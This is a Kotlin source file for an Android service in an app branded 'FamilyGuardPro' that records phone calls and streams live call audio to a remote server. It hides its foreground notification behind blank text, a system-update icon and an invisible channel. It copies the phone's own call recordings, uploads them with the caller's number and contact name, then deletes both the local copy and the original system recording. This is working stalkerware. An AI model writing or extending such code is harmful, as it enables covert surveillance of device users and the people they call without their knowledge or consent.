package com.familyguardpro.services

import android.Manifest
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.IBinder
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.AudioRecorder
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.*
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import android.database.Cursor
import android.net.Uri
import android.provider.ContactsContract
import android.os.Environment
import java.io.File
import java.net.URI
import java.text.SimpleDateFormat
import java.util.*

class CallRecordService : Service() {

    companion object {
        private const val TAG = "CallRecordService"
        private const val NOTIFICATION_ID = 1005
        private const val SAMPLE_RATE = 44100 // 44.1kHz for high-quality call audio
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        
        @Volatile
        private var running = false
        
        fun isRunning(): Boolean = running
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager
    
    private var audioRecorder: AudioRecorder? = null
    private var audioRecord: AudioRecord? = null
    private var webSocketClient: WebSocketClient? = null
    private var isRecording = false
    private var isLiveListening = false
    private var currentRecordingFile: File? = null
    private var phoneStateListener: PhoneStateListener? = null
    private var telephonyManager: TelephonyManager? = null
    private var currentPhoneNumber: String? = null
    private var currentCallType: String = "unknown"
    private var recordingStartTime: Long = 0L

    override fun onCreate() {
        super.onCreate()
        running = true
        preferenceManager = PreferenceManager(this)
        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        setupPhoneStateListener()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.w(TAG, "onStartCommand called, mode=${intent?.getStringExtra("mode")}, action=${intent?.action}")
        
        // Handle STOP action
        if (intent?.action == "STOP") {
            Log.w(TAG, "STOP action received")
            stopCallRecording()
            return START_STICKY
        }
        
        startForeground()
        
        // Track phone number from intent
        intent?.getStringExtra("phoneNumber")?.let { number ->
            if (number.isNotEmpty()) {
                currentPhoneNumber = number
                Log.w(TAG, "Updated currentPhoneNumber=$number")
            }
        }
        
        // Track call type from intent - but DON'T override if recording is already in progress
        // This prevents PhoneStateReceiver from overwriting outgoing→incoming
        intent?.getStringExtra("callType")?.let { type ->
            if (type.isNotEmpty()) {
                if (isRecording && currentCallType != "unknown") {
                    Log.w(TAG, "Ignoring callType=$type update because recording is active with callType=$currentCallType")
                } else {
                    currentCallType = type
                    Log.w(TAG, "Updated currentCallType=$type")
                }
            }
        }
        
        // ALWAYS ensure PhoneStateListener is registered when call recording is enabled
        val isEnabled = preferenceManager.isCallRecordingEnabled()
        val hasPermission = hasPhonePermission()
        Log.w(TAG, "Call recording enabled=$isEnabled, hasPhonePermission=$hasPermission")
        if (isEnabled && hasPermission) {
            registerPhoneStateListener()
        }
        
        when (intent?.getStringExtra("mode")) {
            "live_listen" -> startLiveListen()
            "record" -> startRecording()
            else -> {
                // Service started for call detection - listener already registered above
                if (!isEnabled) {
                    Log.d(TAG, "Call recording disabled in preferences")
                }
            }
        }
        
        return START_STICKY
    }
    
    private fun hasPhonePermission(): Boolean {
        return ActivityCompat.checkSelfPermission(
            this, Manifest.permission.READ_PHONE_STATE
        ) == PackageManager.PERMISSION_GRANTED
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        running = false
        stopForeground(STOP_FOREGROUND_REMOVE)
        cancelAllNotifications()
        stopCallRecording()
        stopLiveListen()
        unregisterPhoneStateListener()
    }
    
    private fun cancelAllNotifications() {
        try {
            val nm = getSystemService(android.app.NotificationManager::class.java)
            nm.cancel(NOTIFICATION_ID)
            nm.cancelAll()
            for (id in 1001..1020) {
                try { nm.cancel(id) } catch (e: Exception) {}
            }
        } catch (e: Exception) {}
    }

    private fun startForeground() {
        try {
            // Check if Device Owner mode - use invisible channel
            val doManager = try {
                com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
            } catch (e: Exception) { null }
            
            val channelId = if (doManager?.isDeviceOwner() == true) {
                com.familyguardpro.utils.NotificationUtils.ensureInvisibleChannel(this)
                com.familyguardpro.deviceowner.DeviceOwnerManager.INVISIBLE_CHANNEL_ID
            } else {
                FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING
            }
            
            val notification = NotificationCompat.Builder(this, channelId)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(R.drawable.ic_system_update)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build()
            
            startForeground(NOTIFICATION_ID, notification)
            
            // Suppress notification in Device Owner mode
            com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
                this, NOTIFICATION_ID
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground: ${e.message}")
            stopSelf()
        }
    }

    @Suppress("DEPRECATION")
    private fun setupPhoneStateListener() {
        Log.d(TAG, "Setting up PhoneStateListener")
        phoneStateListener = object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                Log.w(TAG, "onCallStateChanged: state=$state, phoneNumber=$phoneNumber")
                when (state) {
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        Log.w(TAG, "CALL_STATE_OFFHOOK - Call active")
                        if (!phoneNumber.isNullOrEmpty()) currentPhoneNumber = phoneNumber
                        val shouldRecord = preferenceManager.isCallRecordingEnabled() && !isRecording
                        Log.w(TAG, "shouldRecord=$shouldRecord, isRecording=$isRecording")
                        if (shouldRecord) {
                            startCallRecording()
                        }
                    }
                    TelephonyManager.CALL_STATE_IDLE -> {
                        Log.w(TAG, "CALL_STATE_IDLE - Call ended, isRecording=$isRecording")
                        if (isRecording) {
                            stopCallRecording()
                        }
                    }
                    TelephonyManager.CALL_STATE_RINGING -> {
                        Log.w(TAG, "CALL_STATE_RINGING - Incoming call from $phoneNumber")
                        if (!phoneNumber.isNullOrEmpty()) currentPhoneNumber = phoneNumber
                        currentCallType = "incoming"
                    }
                }
            }
        }
    }

    @Suppress("DEPRECATION")
    private fun registerPhoneStateListener() {
        try {
            Log.w(TAG, "Registering PhoneStateListener with TelephonyManager")
            telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
            Log.w(TAG, "PhoneStateListener registered successfully")
        } catch (e: SecurityException) {
            Log.w(TAG, "SecurityException registering phone state listener: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Error registering phone state listener: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    private fun unregisterPhoneStateListener() {
        try {
            telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering phone state listener: ${e.message}")
        }
    }

    // System call recording directories to check (Vivo, Samsung, Xiaomi, etc.)
    private val systemRecordingDirs = listOf(
        File(Environment.getExternalStorageDirectory(), "Recordings/Record/Call"),  // Vivo
        File(Environment.getExternalStorageDirectory(), "Recordings/Call"),          // Some Vivo variants
        File(Environment.getExternalStorageDirectory(), "Record/Call"),              // Alternative
        File(Environment.getExternalStorageDirectory(), "Music/Recordings/Call Recordings"), // Samsung
        File(Environment.getExternalStorageDirectory(), "Call Recordings"),          // Generic
        File(Environment.getExternalStorageDirectory(), "MIUI/sound_recorder/call_rec"), // Xiaomi
        File(Environment.getExternalStorageDirectory(), "PhoneRecord"),             // Oppo/Realme
    )

    private fun startCallRecording() {
        if (isRecording) {
            Log.w(TAG, "startCallRecording() skipped - already recording")
            return
        }
        isRecording = true
        recordingStartTime = System.currentTimeMillis()
        
        Log.w(TAG, "Starting call recording for: $currentPhoneNumber, callType=$currentCallType, startTime=$recordingStartTime")
        
        // Snapshot existing system call recordings so we can detect new ones
        snapshotSystemRecordings()
        
        // Also start AudioRecorder as fallback (may be silent on some devices like Vivo)
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val fileName = "call_${timestamp}.mp3"
        currentRecordingFile = File(cacheDir, fileName)
        
        audioRecorder = AudioRecorder(this)
        val recordStarted = audioRecorder?.startRecording(currentRecordingFile!!.absolutePath, forCallRecording = true)
        Log.w(TAG, "AudioRecorder.startRecording returned: $recordStarted")
    }

    // Set of files that existed before the call started
    private var preCallSystemFiles = mutableSetOf<String>()

    private fun snapshotSystemRecordings() {
        preCallSystemFiles.clear()
        for (dir in systemRecordingDirs) {
            if (dir.exists() && dir.isDirectory) {
                dir.listFiles()?.forEach { file ->
                    preCallSystemFiles.add(file.absolutePath)
                }
                Log.w(TAG, "Snapshot ${dir.absolutePath}: ${dir.listFiles()?.size ?: 0} files")
            }
        }
        Log.w(TAG, "Pre-call system files snapshot: ${preCallSystemFiles.size} total")
    }

    private fun findNewSystemRecording(): File? {
        val newFiles = mutableListOf<File>()
        for (dir in systemRecordingDirs) {
            if (dir.exists() && dir.isDirectory) {
                dir.listFiles()?.forEach { file ->
                    if (!preCallSystemFiles.contains(file.absolutePath) && 
                        file.isFile && file.length() > 1000) { // At least 1KB
                        newFiles.add(file)
                        Log.w(TAG, "Found NEW system recording: ${file.absolutePath}, size=${file.length()}")
                    }
                }
            }
        }
        // Return the newest file (by last modified)
        return newFiles.maxByOrNull { it.lastModified() }
    }

    private fun stopCallRecording() {
        if (!isRecording) {
            Log.w(TAG, "stopCallRecording() skipped - not recording")
            return
        }
        isRecording = false
        
        // Calculate actual duration in seconds
        var durationSeconds = if (recordingStartTime > 0L) {
            ((System.currentTimeMillis() - recordingStartTime) / 1000).toInt()
        } else 0
        
        Log.w(TAG, "Stopping call recording, duration=${durationSeconds}s, recordingStartTime=$recordingStartTime, callType=$currentCallType")
        
        audioRecorder?.stopRecording()
        
        // Resolve contact name from phone number
        val contactName = getContactName(currentPhoneNumber)
        Log.w(TAG, "Resolved contact name: $contactName for number: $currentPhoneNumber")
        
        // Save state before resetting
        val phoneNumber = currentPhoneNumber
        val callType = currentCallType
        val callStartTime = recordingStartTime
        
        // Reset state for next call
        recordingStartTime = 0L
        currentCallType = "unknown"
        
        // Use coroutine to wait for system recording to be written, then upload
        serviceScope.launch {
            // Wait for system recording to finish writing (Vivo may take a few seconds)
            delay(3000)
            
            // PRIORITY 1: Check for system call recording (Vivo, Samsung, etc.)
            val systemRecording = findNewSystemRecording()
            
            if (systemRecording != null) {
                Log.w(TAG, "*** USING SYSTEM CALL RECORDING: ${systemRecording.absolutePath}, size=${systemRecording.length()} ***")
                
                // Copy system recording to our directory
                val recordingsDir = File(getExternalFilesDir(null), "CallRecordings")
                if (!recordingsDir.exists()) recordingsDir.mkdirs()
                
                val permanentFile = File(recordingsDir, systemRecording.name)
                systemRecording.copyTo(permanentFile, overwrite = true)
                
                // Calculate duration from file if needed
                if (durationSeconds <= 0) {
                    // For m4a, estimate from file size (~16kbps bitrate for phone quality)
                    durationSeconds = (systemRecording.length() / 2000).toInt().coerceAtLeast(1)
                    Log.w(TAG, "Estimated duration from system recording: ${durationSeconds}s")
                }
                
                Log.w(TAG, "Uploading SYSTEM recording: phone=$phoneNumber, contact=$contactName, type=$callType, duration=${durationSeconds}s")
                uploadCallRecordingWithAutoDelete(permanentFile, phoneNumber, contactName, durationSeconds, callType, systemRecording)
                
                // Delete AudioRecorder temp file since we have system recording
                currentRecordingFile?.delete()
                
            } else {
                // PRIORITY 2: Fall back to AudioRecorder output
                Log.w(TAG, "No system recording found, falling back to AudioRecorder output")
                
                val fileSize = currentRecordingFile?.length() ?: 0
                Log.w(TAG, "AudioRecorder cache file: ${currentRecordingFile?.absolutePath}, exists=${currentRecordingFile?.exists()}, size=$fileSize")
                
                // Fallback duration from WAV file data
                if (durationSeconds <= 0 && fileSize > 44) {
                    var byteRate = 88200L
                    try {
                        val wavFile = java.io.RandomAccessFile(currentRecordingFile, "r")
                        wavFile.seek(28)
                        val b0 = wavFile.read().toLong()
                        val b1 = wavFile.read().toLong()
                        val b2 = wavFile.read().toLong()
                        val b3 = wavFile.read().toLong()
                        byteRate = b0 or (b1 shl 8) or (b2 shl 16) or (b3 shl 24)
                        wavFile.close()
                        Log.w(TAG, "WAV byte rate from header: $byteRate")
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to read WAV header, using default byteRate: $byteRate")
                    }
                    if (byteRate > 0) {
                        durationSeconds = ((fileSize - 44) / byteRate).toInt()
                    }
                    Log.w(TAG, "Using fallback duration from file size: ${durationSeconds}s")
                }
                
                currentRecordingFile?.let { file ->
                    if (file.exists() && file.length() > 0) {
                        val recordingsDir = File(getExternalFilesDir(null), "CallRecordings")
                        if (!recordingsDir.exists()) recordingsDir.mkdirs()
                        
                        val permanentFile = File(recordingsDir, file.name)
                        file.copyTo(permanentFile, overwrite = true)
                        file.delete()
                        
                        Log.w(TAG, "Uploading AudioRecorder: phone=$phoneNumber, contact=$contactName, type=$callType, duration=${durationSeconds}s")
                        uploadCallRecordingWithAutoDelete(permanentFile, phoneNumber, contactName, durationSeconds, callType)
                    } else {
                        Log.w(TAG, "No file to upload: exists=${file.exists()}, size=${file.length()}")
                    }
                }
            }
        }
    }

    private fun getContactName(phoneNumber: String?): String? {
        if (phoneNumber.isNullOrEmpty()) return null
        try {
            val uri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber)
            )
            val projection = arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME)
            val cursor: Cursor? = contentResolver.query(uri, projection, null, null, null)
            cursor?.use {
                if (it.moveToFirst()) {
                    return it.getString(it.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Could not resolve contact name for $phoneNumber: ${e.message}")
        }
        return null
    }

    private fun uploadCallRecordingWithAutoDelete(file: File, phoneNumber: String?, contactName: String?, durationSeconds: Int, callType: String = "unknown", systemSourceFile: File? = null) {
        serviceScope.launch {
            var uploadSuccess = false
            var retryCount = 0
            val maxRetries = 3
            
            while (!uploadSuccess && retryCount < maxRetries) {
                uploadSuccess = uploadCallRecording(file, phoneNumber, contactName, durationSeconds, callType)
                if (!uploadSuccess) {
                    retryCount++
                    Log.w(TAG, "Upload failed, retry $retryCount/$maxRetries")
                    delay(10000) // Wait 10 seconds between retries
                }
            }
            
            if (uploadSuccess) {
                Log.w(TAG, "Call recording uploaded successfully, scheduling deletion in 2 minutes")
                // Delete after 2 minutes
                delay(2 * 60 * 1000L) // 2 minutes
                if (file.exists()) {
                    file.delete()
                    Log.w(TAG, "Local copy deleted from device: ${file.name}")
                }
                // Also delete the ORIGINAL system recording (from Vivo's Recordings folder)
                if (systemSourceFile != null && systemSourceFile.exists()) {
                    systemSourceFile.delete()
                    Log.w(TAG, "System source recording deleted: ${systemSourceFile.absolutePath}")
                }
            } else {
                Log.e(TAG, "Failed to upload after $maxRetries retries, keeping file for later sync")
                // Mark file for later sync
                val markerFile = File(file.parent, "${file.name}.pending")
                markerFile.writeText(phoneNumber ?: "Unknown")
            }
        }
    }

    private suspend fun uploadCallRecording(file: File, phoneNumber: String?, contactName: String?, durationSeconds: Int, callType: String = "unknown"): Boolean {
        return try {
            val deviceId = preferenceManager.getDeviceId()
            val baseUrl = ApiClient.BASE_URL.trimEnd('/')
            val uploadUrl = "$baseUrl/api/sync/call-recording"
            
            Log.w(TAG, "Uploading call recording: ${file.name}, size=${file.length()}, duration=${durationSeconds}s, contact=$contactName, deviceId=$deviceId")
            
            val duration = durationSeconds
            
            // Create multipart request
            val boundary = "----FormBoundary${System.currentTimeMillis()}"
            val connection = java.net.URL(uploadUrl).openConnection() as java.net.HttpURLConnection
            
            connection.connectTimeout = 30000
            connection.readTimeout = 30000
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            connection.setRequestProperty("x-device-id", deviceId)
            
            val outputStream = connection.outputStream
            val writer = java.io.PrintWriter(java.io.OutputStreamWriter(outputStream, "UTF-8"), true)
            
            // Add deviceId field
            writer.append("--$boundary\r\n")
            writer.append("Content-Disposition: form-data; name=\"deviceId\"\r\n\r\n")
            writer.append(deviceId)
            
            // Add file field
            writer.append("\r\n--$boundary\r\n")
            writer.append("Content-Disposition: form-data; name=\"recording\"; filename=\"${file.name}\"\r\n")
            val contentType = when {
                file.name.endsWith(".m4a", true) -> "audio/mp4"
                file.name.endsWith(".wav", true) -> "audio/wav"
                file.name.endsWith(".amr", true) -> "audio/amr"
                else -> "audio/mpeg"
            }
            writer.append("Content-Type: $contentType\r\n\r\n")
            writer.flush()
            
            // Write file data
            file.inputStream().use { input ->
                input.copyTo(outputStream)
            }
            outputStream.flush()
            
            // Add phoneNumber field
            writer.append("\r\n--$boundary\r\n")
            writer.append("Content-Disposition: form-data; name=\"phoneNumber\"\r\n\r\n")
            writer.append(phoneNumber ?: "Unknown")
            
            // Add contactName field
            writer.append("\r\n--$boundary\r\n")
            writer.append("Content-Disposition: form-data; name=\"contactName\"\r\n\r\n")
            writer.append(contactName ?: "")
            
            // Add callType field - use the passed callType parameter, not the class variable
            writer.append("\r\n--$boundary\r\n")
            writer.append("Content-Disposition: form-data; name=\"callType\"\r\n\r\n")
            writer.append(if (callType != "unknown") callType else "incoming")
            
            // Add duration field
            writer.append("\r\n--$boundary\r\n")
            writer.append("Content-Disposition: form-data; name=\"duration\"\r\n\r\n")
            writer.append(duration.toString())
            
            // Add timestamp field
            writer.append("\r\n--$boundary\r\n")
            writer.append("Content-Disposition: form-data; name=\"timestamp\"\r\n\r\n")
            writer.append(System.currentTimeMillis().toString())
            
            // End boundary
            writer.append("\r\n--$boundary--\r\n")
            writer.flush()
            
            val responseCode = connection.responseCode
            connection.disconnect()
            
            if (responseCode in 200..299) {
                Log.w(TAG, "Call recording uploaded successfully: ${file.name}")
                true
            } else {
                // Read error response
                val errorStream = connection.errorStream
                val errorMsg = errorStream?.bufferedReader()?.readText() ?: "No error message"
                Log.e(TAG, "Upload failed: HTTP $responseCode - $errorMsg")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Upload error: ${e.javaClass.simpleName} - ${e.message}")
            e.printStackTrace()
            false
        }
    }

    private fun startRecording() {
        // One-time recording
        val duration = 60 // seconds
        startCallRecording()
        
        serviceScope.launch {
            delay(duration * 1000L)
            stopCallRecording()
            stopSelf()
        }
    }

    private fun startLiveListen() {
        if (isLiveListening) return
        isLiveListening = true
        
        Log.d(TAG, "Starting live call listen")
        
        connectWebSocket {
            startAudioStreaming()
        }
    }

    private fun stopLiveListen() {
        if (!isLiveListening) return
        isLiveListening = false
        
        audioRecord?.stop()
        audioRecord?.release()
        audioRecord = null
        
        webSocketClient?.close()
        webSocketClient = null
    }

    private fun connectWebSocket(onConnected: () -> Unit) {
        val baseUrl = ApiClient.BASE_URL
            .trimEnd('/')
            .replace("https://", "wss://")
            .replace("http://", "ws://")
        
        val wsUrl = "$baseUrl/api/stream/${preferenceManager.getDeviceId()}?type=live_call"
        
        webSocketClient = object : WebSocketClient(URI(wsUrl)) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                Log.d(TAG, "WebSocket connected")
                onConnected()
            }

            override fun onMessage(message: String?) {}

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                Log.d(TAG, "WebSocket closed")
            }

            override fun onError(ex: Exception?) {
                Log.e(TAG, "WebSocket error", ex)
            }
        }
        
        webSocketClient?.connect()
    }

    private fun startAudioStreaming() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Audio permission not granted")
            return
        }
        
        // Try multiple sample rates for best quality
        val sampleRates = listOf(44100, 16000, 8000)
        val audioSources = listOf(
            MediaRecorder.AudioSource.VOICE_CALL,
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            MediaRecorder.AudioSource.MIC
        )
        
        var activeSampleRate = SAMPLE_RATE
        var initialized = false
        
        for (rate in sampleRates) {
            if (initialized) break
            for (source in audioSources) {
                try {
                    val minBuf = AudioRecord.getMinBufferSize(rate, CHANNEL_CONFIG, AUDIO_FORMAT)
                    if (minBuf <= 0) continue
                    val bufSize = minBuf * 8 // 8x buffer for smooth high-quality streaming
                    
                    audioRecord = AudioRecord(source, rate, CHANNEL_CONFIG, AUDIO_FORMAT, bufSize)
                    
                    if (audioRecord?.state == AudioRecord.STATE_INITIALIZED) {
                        activeSampleRate = rate
                        Log.w(TAG, "Call streaming AudioRecord initialized: source=$source, rate=${rate}Hz, buffer=$bufSize")
                        initialized = true
                        break
                    } else {
                        audioRecord?.release()
                        audioRecord = null
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Failed init call stream: source=$source @${rate}Hz: ${e.message}")
                    audioRecord?.release()
                    audioRecord = null
                }
            }
        }
        
        if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
            Log.e(TAG, "Call streaming AudioRecord init failed")
            return
        }
        
        audioRecord?.startRecording()
        
        serviceScope.launch(Dispatchers.IO) {
            val minBuf = AudioRecord.getMinBufferSize(activeSampleRate, CHANNEL_CONFIG, AUDIO_FORMAT)
            val buffer = ByteArray(minBuf)
            
            while (isLiveListening && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                val read = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                if (read > 0) {
                    sendAudioData(buffer.copyOf(read))
                }
            }
        }
    }

    private fun sendAudioData(data: ByteArray) {
        if (webSocketClient?.isOpen != true) return
        
        try {
            val audioBase64 = Base64.encodeToString(data, Base64.NO_WRAP)
            webSocketClient?.send("audio:$audioBase64")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send audio", e)
        }
    }
}
